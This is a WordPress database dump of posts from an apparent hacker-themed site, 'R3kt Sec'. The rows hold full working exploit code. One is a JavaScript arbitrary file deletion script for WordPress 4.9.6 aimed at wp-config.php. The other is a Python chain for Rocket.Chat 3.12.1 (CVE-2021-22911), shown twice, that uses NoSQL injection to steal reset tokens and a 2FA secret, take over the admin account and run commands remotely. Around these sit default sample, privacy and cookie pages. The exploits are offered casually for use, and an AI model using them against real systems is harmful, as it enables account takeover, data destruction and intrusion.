(13, 1, '2022-10-23 08:17:48', '2022-10-23 08:17:48', '<!-- wp:paragraph -->\n<p>A JavaScript based one for y\'all today. Enjoy!</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:code -->\n<pre class=\"wp-block-code\"><code>/*\r\n\r\nUsage:\r\n  1. Login to wordpress with privileges of an author\r\n  2. Navigates to Media > Add New > Select Files > Open/Upload\r\n  3. Click Edit > Open Developer Console > Paste this exploit script\r\n  4. Execute the function, eg: unlink_thumb(\"../../../../wp-config.php\")\r\n*/\r\n\r\nfunction unlink_thumb(thumb) {\r\n\r\n  $nonce_id = document.getElementById(\"_wpnonce\").value\r\n  if (thumb == null) {\r\n    console.log(\"specify a file to delete\")\r\n    return false\r\n  }\r\n  if ($nonce_id == null) {\r\n    console.log(\"the nonce id is not found\")\r\n    return false\r\n  }\r\n\r\n  fetch(window.location.href.replace(\"&amp;action=edit\",\"\"),\r\n    {\r\n      method: \'POST\',\r\n      credentials: \'include\',\r\n      headers: {\'Content-Type\': \'application/x-www-form-urlencoded\'},\r\n      body: \"action=editattachment&amp;_wpnonce=\" + $nonce_id + \"&amp;thumb=\" + thumb\r\n    })\r\n    .then(function(resp0) {\r\n      if (resp0.redirected) {\r\n        $del = document.getElementsByClassName(\"submitdelete deletion\").item(0).href\r\n        if ($del == null) {\r\n          console.log(\"Unknown error: could not find the url action\")\r\n          return false\r\n        }\r\n        fetch($del, \r\n          {\r\n            method: \'GET\',\r\n            credentials: \'include\'\r\n          }).then(function(resp1) {\r\n            if (resp1.redirected) {\r\n              console.log(\"Arbitrary file deletion of \" + thumb + \" succeed!\")\r\n              return true\r\n            } else {\r\n              console.log(\"Arbitrary file deletion of \" + thumb + \" failed!\")\r\n              return false\r\n            }\r\n          })\r\n      } else {\r\n        console.log(\"Arbitrary file deletion of \" + thumb + \" failed!\")\r\n        return false\r\n      }\r\n    })\r\n}</code></pre>\n<!-- /wp:code -->', 'Wordpress 4.9.6 - Arbitrary File Deletion', '', 'inherit', 'closed', 'closed', '', '12-revision-v1', '', '', '2022-10-23 08:17:48', '2022-10-23 08:17:48', '', 12, 'http://localhost/?p=13', 0, 'revision', '', 0),
(14, 1, '2022-10-23 08:20:28', '2022-10-23 08:20:28', '<!-- wp:paragraph -->\n<p>enox coming thru with this CVE-2021-22911.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>This boy on fire.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:code -->\n<pre class=\"wp-block-code\"><code>#!/usr/bin/python\r\n\r\nimport requests\r\nimport string\r\nimport time\r\nimport hashlib\r\nimport json\r\nimport oathtool\r\nimport argparse\r\n\r\nparser = argparse.ArgumentParser(description=\'RocketChat 3.12.1 RCE\')\r\nparser.add_argument(\'-u\', help=\'Low priv user email &#91; No 2fa ]\', required=True)\r\nparser.add_argument(\'-a\', help=\'Administrator email\', required=True)\r\nparser.add_argument(\'-t\', help=\'URL (Eg: http://rocketchat.local)\', required=True)\r\nargs = parser.parse_args()\r\n\r\n\r\nadminmail = args.a\r\nlowprivmail = args.u\r\ntarget = args.t\r\n\r\n\r\ndef forgotpassword(email,url):\r\n	payload=\'{\"message\":\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"sendForgotPasswordEmail\\\\\",\\\\\"params\\\\\":&#91;\\\\\"\'+email+\'\\\\\"]}\"}\'\r\n	headers={\'content-type\': \'application/json\'}\r\n	r = requests.post(url+\"/api/v1/method.callAnon/sendForgotPasswordEmail\", data = payload, headers = headers, verify = False, allow_redirects = False)\r\n	print(\"&#91;+] Password Reset Email Sent\")\r\n\r\n\r\ndef resettoken(url):\r\n	u = url+\"/api/v1/method.callAnon/getPasswordPolicy\"\r\n	headers={\'content-type\': \'application/json\'}\r\n	token = \"\"\r\n\r\n	num = list(range(0,10))\r\n	string_ints = &#91;str(int) for int in num]\r\n	characters = list(string.ascii_uppercase + string.ascii_lowercase) + list(\'-\')+list(\'_\') + string_ints\r\n\r\n	while len(token)!= 43:\r\n		for c in characters:\r\n			payload=\'{\"message\":\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"getPasswordPolicy\\\\\",\\\\\"params\\\\\":&#91;{\\\\\"token\\\\\":{\\\\\"$regex\\\\\":\\\\\"^%s\\\\\"}}]}\"}\' % (token + c)\r\n			r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)\r\n			time.sleep(0.5)\r\n			if \'Meteor.Error\' not in r.text:\r\n				token += c\r\n				print(f\"Got: {token}\")\r\n\r\n	print(f\"&#91;+] Got token : {token}\")\r\n	return token\r\n\r\n\r\ndef changingpassword(url,token):\r\n	payload = \'{\"message\":\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"resetPassword\\\\\",\\\\\"params\\\\\":&#91;\\\\\"\'+token+\'\\\\\",\\\\\"P@$$w0rd!1234\\\\\"]}\"}\'\r\n	headers={\'content-type\': \'application/json\'}\r\n	r = requests.post(url+\"/api/v1/method.callAnon/resetPassword\", data = payload, headers = headers, verify = False, allow_redirects = False)\r\n	if \"error\" in r.text:\r\n		exit(\"&#91;-] Wrong token\")\r\n	print(\"&#91;+] Password was changed !\")\r\n\r\n\r\ndef twofactor(url,email):\r\n	# Authenticating\r\n	sha256pass = hashlib.sha256(b\'P@$$w0rd!1234\').hexdigest()\r\n	payload =\'{\"message\":\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"login\\\\\",\\\\\"params\\\\\":&#91;{\\\\\"user\\\\\":{\\\\\"email\\\\\":\\\\\"\'+email+\'\\\\\"},\\\\\"password\\\\\":{\\\\\"digest\\\\\":\\\\\"\'+sha256pass+\'\\\\\",\\\\\"algorithm\\\\\":\\\\\"sha-256\\\\\"}}]}\"}\'\r\n	headers={\'content-type\': \'application/json\'}\r\n	r = requests.post(url + \"/api/v1/method.callAnon/login\",data=payload,headers=headers,verify=False,allow_redirects=False)\r\n	if \"error\" in r.text:\r\n		exit(\"&#91;-] Couldn\'t authenticate\")\r\n	data = json.loads(r.text)  \r\n	data =(data&#91;\'message\'])\r\n	userid = data&#91;32:49]\r\n	token = data&#91;60:103]\r\n	print(f\"&#91;+] Succesfully authenticated as {email}\")\r\n\r\n	# Getting 2fa code\r\n	cookies = {\'rc_uid\': userid,\'rc_token\': token}\r\n	headers={\'X-User-Id\': userid,\'X-Auth-Token\': token}\r\n	payload = \'/api/v1/users.list?query={\"$where\"%3a\"this.username%3d%3d%3d\\\'admin\\\'+%26%26+(()%3d>{+throw+this.services.totp.secret+})()\"}\'\r\n	r = requests.get(url+payload,cookies=cookies,headers=headers)\r\n	code = r.text&#91;46:98]\r\n	print(f\"Got the code for 2fa: {code}\")\r\n	return code\r\n\r\n\r\ndef changingadminpassword(url,token,code):\r\n	payload = \'{\"message\":\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"resetPassword\\\\\",\\\\\"params\\\\\":&#91;\\\\\"\'+token+\'\\\\\",\\\\\"P@$$w0rd!1234\\\\\",{\\\\\"twoFactorCode\\\\\":\\\\\"\'+code+\'\\\\\",\\\\\"twoFactorMethod\\\\\":\\\\\"totp\\\\\"}]}\"}\'\r\n	headers={\'content-type\': \'application/json\'}\r\n	r = requests.post(url+\"/api/v1/method.callAnon/resetPassword\", data = payload, headers = headers, verify = False, allow_redirects = False)\r\n	if \"403\" in r.text:\r\n		exit(\"&#91;-] Wrong token\")\r\n\r\n	print(\"&#91;+] Admin password changed !\")\r\n\r\n\r\ndef rce(url,code,cmd):\r\n	# Authenticating\r\n	sha256pass = hashlib.sha256(b\'P@$$w0rd!1234\').hexdigest()\r\n	headers={\'content-type\': \'application/json\'}\r\n	payload = \'{\"message\":\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"login\\\\\",\\\\\"params\\\\\":&#91;{\\\\\"totp\\\\\":{\\\\\"login\\\\\":{\\\\\"user\\\\\":{\\\\\"username\\\\\":\\\\\"admin\\\\\"},\\\\\"password\\\\\":{\\\\\"digest\\\\\":\\\\\"\'+sha256pass+\'\\\\\",\\\\\"algorithm\\\\\":\\\\\"sha-256\\\\\"}},\\\\\"code\\\\\":\\\\\"\'+code+\'\\\\\"}}]}\"}\'\r\n	r = requests.post(url + \"/api/v1/method.callAnon/login\",data=payload,headers=headers,verify=False,allow_redirects=False)\r\n	if \"error\" in r.text:\r\n		exit(\"&#91;-] Couldn\'t authenticate\")\r\n	data = json.loads(r.text)\r\n	data =(data&#91;\'message\'])\r\n	userid = data&#91;32:49]\r\n	token = data&#91;60:103]\r\n	print(\"&#91;+] Succesfully authenticated as administrator\")\r\n\r\n	# Creating Integration\r\n	payload = \'{\"enabled\":true,\"channel\":\"#general\",\"username\":\"admin\",\"name\":\"rce\",\"alias\":\"\",\"avatarUrl\":\"\",\"emoji\":\"\",\"scriptEnabled\":true,\"script\":\"const require = console.log.constructor(\\\'return process.mainModule.require\\\')();\\\\nconst { exec } = require(\\\'child_process\\\');\\\\nexec(\\\'\'+cmd+\'\\\');\",\"type\":\"webhook-incoming\"}\'\r\n	cookies = {\'rc_uid\': userid,\'rc_token\': token}\r\n	headers = {\'X-User-Id\': userid,\'X-Auth-Token\': token}\r\n	r = requests.post(url+\'/api/v1/integrations.create\',cookies=cookies,headers=headers,data=payload)\r\n	data = r.text\r\n	data = data.split(\',\')\r\n	token = data&#91;12]\r\n	token = token&#91;9:57]\r\n	_id = data&#91;18]\r\n	_id = _id&#91;7:24]\r\n\r\n	# Triggering RCE\r\n	u = url + \'/hooks/\' + _id + \'/\' +token\r\n	r = requests.get(u)\r\n	print(r.text)\r\n\r\n############################################################\r\n\r\n\r\n# Getting Low Priv user\r\nprint(f\"&#91;+] Resetting {lowprivmail} password\")\r\n## Sending Reset Mail\r\nforgotpassword(lowprivmail,target)\r\n\r\n## Getting reset token\r\ntoken = resettoken(target)\r\n\r\n## Changing Password\r\nchangingpassword(target,token)\r\n\r\n\r\n# Privilege Escalation to admin\r\n## Getting secret for 2fa\r\nsecret = twofactor(target,lowprivmail)\r\n\r\n\r\n## Sending Reset mail\r\nprint(f\"&#91;+] Resetting {adminmail} password\")\r\nforgotpassword(adminmail,target)\r\n\r\n## Getting reset token\r\ntoken = resettoken(target)\r\n\r\n\r\n## Resetting Password\r\ncode = oathtool.generate_otp(secret)\r\nchangingadminpassword(target,token,code)\r\n\r\n## Authenticting and triggering rce\r\n\r\nwhile True:\r\n	cmd = input(\"CMD:> \")\r\n	code = oathtool.generate_otp(secret)\r\n	rce(target,code,cmd)</code></pre>\n<!-- /wp:code -->', 'Rocket.Chat 3.12.1 - NoSQL Injection to RCE', '', 'publish', 'open', 'open', '', 'rocket-chat-3-12-1-nosql-injection-to-rce', '', '', '2022-10-23 08:23:40', '2022-10-23 08:23:40', '', 0, 'http://localhost/?p=14', 0, 'post', '', 0),
(15, 1, '2022-10-23 08:20:28', '2022-10-23 08:20:28', '<!-- wp:paragraph -->\n<p>enox coming thru with this CVE-2021-22911.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:paragraph -->\n<p>This boy on fire.</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:code -->\n<pre class=\"wp-block-code\"><code>#!/usr/bin/python\r\n\r\nimport requests\r\nimport string\r\nimport time\r\nimport hashlib\r\nimport json\r\nimport oathtool\r\nimport argparse\r\n\r\nparser = argparse.ArgumentParser(description=\'RocketChat 3.12.1 RCE\')\r\nparser.add_argument(\'-u\', help=\'Low priv user email &#91; No 2fa ]\', required=True)\r\nparser.add_argument(\'-a\', help=\'Administrator email\', required=True)\r\nparser.add_argument(\'-t\', help=\'URL (Eg: http://rocketchat.local)\', required=True)\r\nargs = parser.parse_args()\r\n\r\n\r\nadminmail = args.a\r\nlowprivmail = args.u\r\ntarget = args.t\r\n\r\n\r\ndef forgotpassword(email,url):\r\n	payload=\'{\"message\":\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"sendForgotPasswordEmail\\\\\",\\\\\"params\\\\\":&#91;\\\\\"\'+email+\'\\\\\"]}\"}\'\r\n	headers={\'content-type\': \'application/json\'}\r\n	r = requests.post(url+\"/api/v1/method.callAnon/sendForgotPasswordEmail\", data = payload, headers = headers, verify = False, allow_redirects = False)\r\n	print(\"&#91;+] Password Reset Email Sent\")\r\n\r\n\r\ndef resettoken(url):\r\n	u = url+\"/api/v1/method.callAnon/getPasswordPolicy\"\r\n	headers={\'content-type\': \'application/json\'}\r\n	token = \"\"\r\n\r\n	num = list(range(0,10))\r\n	string_ints = &#91;str(int) for int in num]\r\n	characters = list(string.ascii_uppercase + string.ascii_lowercase) + list(\'-\')+list(\'_\') + string_ints\r\n\r\n	while len(token)!= 43:\r\n		for c in characters:\r\n			payload=\'{\"message\":\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"getPasswordPolicy\\\\\",\\\\\"params\\\\\":&#91;{\\\\\"token\\\\\":{\\\\\"$regex\\\\\":\\\\\"^%s\\\\\"}}]}\"}\' % (token + c)\r\n			r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)\r\n			time.sleep(0.5)\r\n			if \'Meteor.Error\' not in r.text:\r\n				token += c\r\n				print(f\"Got: {token}\")\r\n\r\n	print(f\"&#91;+] Got token : {token}\")\r\n	return token\r\n\r\n\r\ndef changingpassword(url,token):\r\n	payload = \'{\"message\":\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"resetPassword\\\\\",\\\\\"params\\\\\":&#91;\\\\\"\'+token+\'\\\\\",\\\\\"P@$$w0rd!1234\\\\\"]}\"}\'\r\n	headers={\'content-type\': \'application/json\'}\r\n	r = requests.post(url+\"/api/v1/method.callAnon/resetPassword\", data = payload, headers = headers, verify = False, allow_redirects = False)\r\n	if \"error\" in r.text:\r\n		exit(\"&#91;-] Wrong token\")\r\n	print(\"&#91;+] Password was changed !\")\r\n\r\n\r\ndef twofactor(url,email):\r\n	# Authenticating\r\n	sha256pass = hashlib.sha256(b\'P@$$w0rd!1234\').hexdigest()\r\n	payload =\'{\"message\":\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"login\\\\\",\\\\\"params\\\\\":&#91;{\\\\\"user\\\\\":{\\\\\"email\\\\\":\\\\\"\'+email+\'\\\\\"},\\\\\"password\\\\\":{\\\\\"digest\\\\\":\\\\\"\'+sha256pass+\'\\\\\",\\\\\"algorithm\\\\\":\\\\\"sha-256\\\\\"}}]}\"}\'\r\n	headers={\'content-type\': \'application/json\'}\r\n	r = requests.post(url + \"/api/v1/method.callAnon/login\",data=payload,headers=headers,verify=False,allow_redirects=False)\r\n	if \"error\" in r.text:\r\n		exit(\"&#91;-] Couldn\'t authenticate\")\r\n	data = json.loads(r.text)  \r\n	data =(data&#91;\'message\'])\r\n	userid = data&#91;32:49]\r\n	token = data&#91;60:103]\r\n	print(f\"&#91;+] Succesfully authenticated as {email}\")\r\n\r\n	# Getting 2fa code\r\n	cookies = {\'rc_uid\': userid,\'rc_token\': token}\r\n	headers={\'X-User-Id\': userid,\'X-Auth-Token\': token}\r\n	payload = \'/api/v1/users.list?query={\"$where\"%3a\"this.username%3d%3d%3d\\\'admin\\\'+%26%26+(()%3d>{+throw+this.services.totp.secret+})()\"}\'\r\n	r = requests.get(url+payload,cookies=cookies,headers=headers)\r\n	code = r.text&#91;46:98]\r\n	print(f\"Got the code for 2fa: {code}\")\r\n	return code\r\n\r\n\r\ndef changingadminpassword(url,token,code):\r\n	payload = \'{\"message\":\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"resetPassword\\\\\",\\\\\"params\\\\\":&#91;\\\\\"\'+token+\'\\\\\",\\\\\"P@$$w0rd!1234\\\\\",{\\\\\"twoFactorCode\\\\\":\\\\\"\'+code+\'\\\\\",\\\\\"twoFactorMethod\\\\\":\\\\\"totp\\\\\"}]}\"}\'\r\n	headers={\'content-type\': \'application/json\'}\r\n	r = requests.post(url+\"/api/v1/method.callAnon/resetPassword\", data = payload, headers = headers, verify = False, allow_redirects = False)\r\n	if \"403\" in r.text:\r\n		exit(\"&#91;-] Wrong token\")\r\n\r\n	print(\"&#91;+] Admin password changed !\")\r\n\r\n\r\ndef rce(url,code,cmd):\r\n	# Authenticating\r\n	sha256pass = hashlib.sha256(b\'P@$$w0rd!1234\').hexdigest()\r\n	headers={\'content-type\': \'application/json\'}\r\n	payload = \'{\"message\":\"{\\\\\"msg\\\\\":\\\\\"method\\\\\",\\\\\"method\\\\\":\\\\\"login\\\\\",\\\\\"params\\\\\":&#91;{\\\\\"totp\\\\\":{\\\\\"login\\\\\":{\\\\\"user\\\\\":{\\\\\"username\\\\\":\\\\\"admin\\\\\"},\\\\\"password\\\\\":{\\\\\"digest\\\\\":\\\\\"\'+sha256pass+\'\\\\\",\\\\\"algorithm\\\\\":\\\\\"sha-256\\\\\"}},\\\\\"code\\\\\":\\\\\"\'+code+\'\\\\\"}}]}\"}\'\r\n	r = requests.post(url + \"/api/v1/method.callAnon/login\",data=payload,headers=headers,verify=False,allow_redirects=False)\r\n	if \"error\" in r.text:\r\n		exit(\"&#91;-] Couldn\'t authenticate\")\r\n	data = json.loads(r.text)\r\n	data =(data&#91;\'message\'])\r\n	userid = data&#91;32:49]\r\n	token = data&#91;60:103]\r\n	print(\"&#91;+] Succesfully authenticated as administrator\")\r\n\r\n	# Creating Integration\r\n	payload = \'{\"enabled\":true,\"channel\":\"#general\",\"username\":\"admin\",\"name\":\"rce\",\"alias\":\"\",\"avatarUrl\":\"\",\"emoji\":\"\",\"scriptEnabled\":true,\"script\":\"const require = console.log.constructor(\\\'return process.mainModule.require\\\')();\\\\nconst { exec } = require(\\\'child_process\\\');\\\\nexec(\\\'\'+cmd+\'\\\');\",\"type\":\"webhook-incoming\"}\'\r\n	cookies = {\'rc_uid\': userid,\'rc_token\': token}\r\n	headers = {\'X-User-Id\': userid,\'X-Auth-Token\': token}\r\n	r = requests.post(url+\'/api/v1/integrations.create\',cookies=cookies,headers=headers,data=payload)\r\n	data = r.text\r\n	data = data.split(\',\')\r\n	token = data&#91;12]\r\n	token = token&#91;9:57]\r\n	_id = data&#91;18]\r\n	_id = _id&#91;7:24]\r\n\r\n	# Triggering RCE\r\n	u = url + \'/hooks/\' + _id + \'/\' +token\r\n	r = requests.get(u)\r\n	print(r.text)\r\n\r\n############################################################\r\n\r\n\r\n# Getting Low Priv user\r\nprint(f\"&#91;+] Resetting {lowprivmail} password\")\r\n## Sending Reset Mail\r\nforgotpassword(lowprivmail,target)\r\n\r\n## Getting reset token\r\ntoken = resettoken(target)\r\n\r\n## Changing Password\r\nchangingpassword(target,token)\r\n\r\n\r\n# Privilege Escalation to admin\r\n## Getting secret for 2fa\r\nsecret = twofactor(target,lowprivmail)\r\n\r\n\r\n## Sending Reset mail\r\nprint(f\"&#91;+] Resetting {adminmail} password\")\r\nforgotpassword(adminmail,target)\r\n\r\n## Getting reset token\r\ntoken = resettoken(target)\r\n\r\n\r\n## Resetting Password\r\ncode = oathtool.generate_otp(secret)\r\nchangingadminpassword(target,token,code)\r\n\r\n## Authenticting and triggering rce\r\n\r\nwhile True:\r\n	cmd = input(\"CMD:> \")\r\n	code = oathtool.generate_otp(secret)\r\n	rce(target,code,cmd)</code></pre>\n<!-- /wp:code -->', 'Rocket.Chat 3.12.1 - NoSQL Injection to RCE', '', 'inherit', 'closed', 'closed', '', '14-revision-v1', '', '', '2022-10-23 08:20:28', '2022-10-23 08:20:28', '', 14, 'http://localhost/?p=15', 0, 'revision', '', 0),
(16, 1, '2022-10-23 08:22:15', '2022-10-23 08:22:15', '{\n    \"exs-dark::copyright_text\": {\n        \"value\": \"R3kt Sec \\u00a9 [year] NERDS\",\n        \"type\": \"theme_mod\",\n        \"user_id\": 1,\n        \"date_modified_gmt\": \"2022-10-23 08:22:15\"\n    },\n    \"exs-dark::copyright_fluid\": {\n        \"value\": false,\n        \"type\": \"theme_mod\",\n        \"user_id\": 1,\n        \"date_modified_gmt\": \"2022-10-23 08:22:15\"\n    }\n}', '', '', 'trash', 'closed', 'closed', '', '82b2d40d-9296-40e6-87e1-93aa8faefcc6', '', '', '2022-10-23 08:22:15', '2022-10-23 08:22:15', '', 0, 'http://localhost/2022/10/23/82b2d40d-9296-40e6-87e1-93aa8faefcc6/', 0, 'customize_changeset', '', 0);
INSERT INTO `wp_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(17, 1, '2022-10-23 08:22:31', '2022-10-23 08:22:31', '<!-- wp:paragraph -->\n<p>This is an example page. It\'s different from a blog post because it will stay in one place and will show up in your site navigation (in most themes). Most people start with an About page that introduces them to potential site visitors. It might say something like this:</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:quote -->\n<blockquote class=\"wp-block-quote\"><p>Hi there! I\'m a bike messenger by day, aspiring actor by night, and this is my website. I live in Los Angeles, have a great dog named Jack, and I like pi&#241;a coladas. (And gettin\' caught in the rain.)</p></blockquote>\n<!-- /wp:quote -->\n\n<!-- wp:paragraph -->\n<p>...or something like this:</p>\n<!-- /wp:paragraph -->\n\n<!-- wp:quote -->\n<blockquote class=\"wp-block-quote\"><p>The XYZ Doohickey Company was founded in 1971, and has been providing quality doohickeys to the public ever since. Located in Gotham City, XYZ employs over 2,000 people and does all kinds of awesome things for the Gotham community.</p></blockquote>\n<!-- /wp:quote -->\n\n<!-- wp:paragraph -->\n<p>As a new WordPress user, you should go to <a href=\"http://localhost/wp-admin/\">your dashboard</a> to delete this page and create new pages for your content. Have fun!</p>\n<!-- /wp:paragraph -->', 'Sample Page', '', 'inherit', 'closed', 'closed', '', '2-revision-v1', '', '', '2022-10-23 08:22:31', '2022-10-23 08:22:31', '', 2, 'http://localhost/?p=17', 0, 'revision', '', 0),
(18, 1, '2022-10-23 08:22:36', '2022-10-23 08:22:36', '<!-- wp:heading --><h2>Who we are</h2><!-- /wp:heading --><!-- wp:paragraph --><p><strong class=\"privacy-policy-tutorial\">Suggested text: </strong>Our website address is: http://localhost.</p><!-- /wp:paragraph --><!-- wp:heading --><h2>Comments</h2><!-- /wp:heading --><!-- wp:paragraph --><p><strong class=\"privacy-policy-tutorial\">Suggested text: </strong>When visitors leave comments on the site we collect the data shown in the comments form, and also the visitor&#8217;s IP address and browser user agent string to help spam detection.</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>An anonymized string created from your email address (also called a hash) may be provided to the Gravatar service to see if you are using it. The Gravatar service privacy policy is available here: https://automattic.com/privacy/. After approval of your comment, your profile picture is visible to the public in the context of your comment.</p><!-- /wp:paragraph --><!-- wp:heading --><h2>Media</h2><!-- /wp:heading --><!-- wp:paragraph --><p><strong class=\"privacy-policy-tutorial\">Suggested text: </strong>If you upload images to the website, you should avoid uploading images with embedded location data (EXIF GPS) included. Visitors to the website can download and extract any location data from images on the website.</p><!-- /wp:paragraph --><!-- wp:heading --><h2>Cookies</h2><!-- /wp:heading --><!-- wp:paragraph --><p><strong class=\"privacy-policy-tutorial\">Suggested text: </strong>If you leave a comment on our site you may opt-in to saving your name, email address and website in cookies. These are for your convenience so that you do not have to fill in your details again when you leave another comment. These cookies will last for one year.</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>If you visit our login page, we will set a temporary cookie to determine if your browser accepts cookies. This cookie contains no personal data and is discarded when you close your browser.</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>When you log in, we will also set up several cookies to save your login information and your screen display choices. Login cookies last for two days, and screen options cookies last for a year. If you select &quot;Remember Me&quot;, your login will persist for two weeks. If you log out of your account, the login cookies will be removed.</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>If you edit or publish an article, an additional cookie will be saved in your browser. This cookie includes no personal data and simply indicates the post ID of the article you just edited. It expires after 1 day.</p><!-- /wp:paragraph --><!-- wp:heading --><h2>Embedded content from other websites</h2><!-- /wp:heading --><!-- wp:paragraph --><p><strong class=\"privacy-policy-tutorial\">Suggested text: </strong>Articles on this site may include embedded content (e.g. videos, images, articles, etc.). Embedded content from other websites behaves in the exact same way as if the visitor has visited the other website.</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>These websites may collect data about you, use cookies, embed additional third-party tracking, and monitor your interaction with that embedded content, including tracking your interaction with the embedded content if you have an account and are logged in to that website.</p><!-- /wp:paragraph --><!-- wp:heading --><h2>Who we share your data with</h2><!-- /wp:heading --><!-- wp:paragraph --><p><strong class=\"privacy-policy-tutorial\">Suggested text: </strong>If you request a password reset, your IP address will be included in the reset email.</p><!-- /wp:paragraph --><!-- wp:heading --><h2>How long we retain your data</h2><!-- /wp:heading --><!-- wp:paragraph --><p><strong class=\"privacy-policy-tutorial\">Suggested text: </strong>If you leave a comment, the comment and its metadata are retained indefinitely. This is so we can recognize and approve any follow-up comments automatically instead of holding them in a moderation queue.</p><!-- /wp:paragraph --><!-- wp:paragraph --><p>For users that register on our website (if any), we also store the personal information they provide in their user profile. All users can see, edit, or delete their personal information at any time (except they cannot change their username). Website administrators can also see and edit that information.</p><!-- /wp:paragraph --><!-- wp:heading --><h2>What rights you have over your data</h2><!-- /wp:heading --><!-- wp:paragraph --><p><strong class=\"privacy-policy-tutorial\">Suggested text: </strong>If you have an account on this site, or have left comments, you can request to receive an exported file of the personal data we hold about you, including any data you have provided to us. You can also request that we erase any personal data we hold about you. This does not include any data we are obliged to keep for administrative, legal, or security purposes.</p><!-- /wp:paragraph --><!-- wp:heading --><h2>Where your data is sent</h2><!-- /wp:heading --><!-- wp:paragraph --><p><strong class=\"privacy-policy-tutorial\">Suggested text: </strong>Visitor comments may be checked through an automated spam detection service.</p><!-- /wp:paragraph -->', 'Privacy Policy', '', 'inherit', 'closed', 'closed', '', '3-revision-v1', '', '', '2022-10-23 08:22:36', '2022-10-23 08:22:36', '', 3, 'http://localhost/?p=18', 0, 'revision', '', 0),
(19, 1, '2022-10-23 08:34:16', '2022-10-23 08:34:16', '<!-- wp:complianz/document {\"title\":\"Cookie Policy (EU)\",\"selectedDocument\":\"cookie-statement\"} /-->', 'Cookie Policy (EU)', '', 'publish', 'closed', 'closed', '', 'cookie-policy-eu', '', '', '2022-10-23 08:34:18', '2022-10-23 08:34:18', '', 0, 'http://localhost/cookie-policy-eu/', 0, 'page', '', 0),
(20, 1, '2022-10-23 08:34:18', '2022-10-23 08:34:18', '<!-- wp:complianz/document {\"title\":\"Cookie Policy (EU)\",\"selectedDocument\":\"cookie-statement\"} /-->', 'Cookie Policy (EU)', '', 'inherit', 'closed', 'closed', '', '19-revision-v1', '', '', '2022-10-23 08:34:18', '2022-10-23 08:34:18', '', 19, 'http://localhost/?p=20', 0, 'revision', '', 0),
(22, 1, '2022-10-23 14:05:47', '2022-10-23 14:05:47', '<!-- wp:shortcode -->\n[gwolle_gb]\n<!-- /wp:shortcode -->', 'Guestbook - Leave R3kt Sec a ❤', '', 'publish', 'closed', 'closed', '', 'gwolle_gb-2', '', '', '2022-10-23 14:06:48', '2022-10-23 14:06:48', '', 0, 'http://localhost/?page_id=22', 0, 'page', '', 0),
(23, 1, '2022-10-23 14:05:47', '2022-10-23 14:05:47', '', '[gwolle_gb]', '', 'inherit', 'closed', 'closed', '', '22-revision-v1', '', '', '2022-10-23 14:05:47', '2022-10-23 14:05:47', '', 22, 'http://localhost/?p=23', 0, 'revision', '', 0),
(24, 1, '2022-10-23 14:06:30', '2022-10-23 14:06:30', '<!-- wp:shortcode -->\n[gwolle_gb]\n<!-- /wp:shortcode -->', 'Guestbook', '', 'inherit', 'closed', 'closed', '', '22-revision-v1', '', '', '2022-10-23 14:06:30', '2022-10-23 14:06:30', '', 22, 'http://localhost/?p=24', 0, 'revision', '', 0),
(25, 1, '2022-10-23 14:06:48', '2022-10-23 14:06:48', '<!-- wp:shortcode -->\n[gwolle_gb]\n<!-- /wp:shortcode -->', 'Guestbook - Leave R3kt Sec a ❤', '', 'inherit', 'closed', 'closed', '', '22-revision-v1', '', '', '2022-10-23 14:06:48', '2022-10-23 14:06:48', '', 22, 'http://localhost/?p=25', 0, 'revision', '', 0),
(26, 1, '2022-10-23 14:08:49', '2022-10-23 14:08:49', '{\n    \"exs-dark::nav_menu_locations[topline]\": {\n        \"value\": -1864939159691585500,\n        \"type\": \"theme_mod\",\n        \"user_id\": 1,\n        \"date_modified_gmt\": \"2022-10-23 14:08:49\"\n    },\n    \"nav_menu[-1864939159691585500]\": {\n        \"value\": {\n            \"name\": \"Custom Menu\",\n            \"description\": \"\",\n            \"parent\": 0,\n            \"auto_add\": false\n        },\n        \"type\": \"nav_menu\",\n        \"user_id\": 1,\n        \"date_modified_gmt\": \"2022-10-23 14:08:49\"\n    },\n    \"nav_menu_item[-2630969359147376600]\": {\n        \"value\": {\n            \"object_id\": 22,\n            \"object\": \"page\",\n            \"menu_item_parent\": 0,\n            \"position\": 2,\n            \"type\": \"post_type\",\n            \"title\": \"Guestbook - Leave R3kt Sec a \\u2764\",\n            \"url\": \"http://localhost/gwolle_gb-2/\",\n            \"target\": \"\",\n            \"attr_title\": \"\",\n            \"description\": \"\",\n            \"classes\": \"\",\n            \"xfn\": \"\",\n            \"status\": \"publish\",\n            \"original_title\": \"Guestbook - Leave R3kt Sec a \\u2764\",\n            \"nav_menu_term_id\": 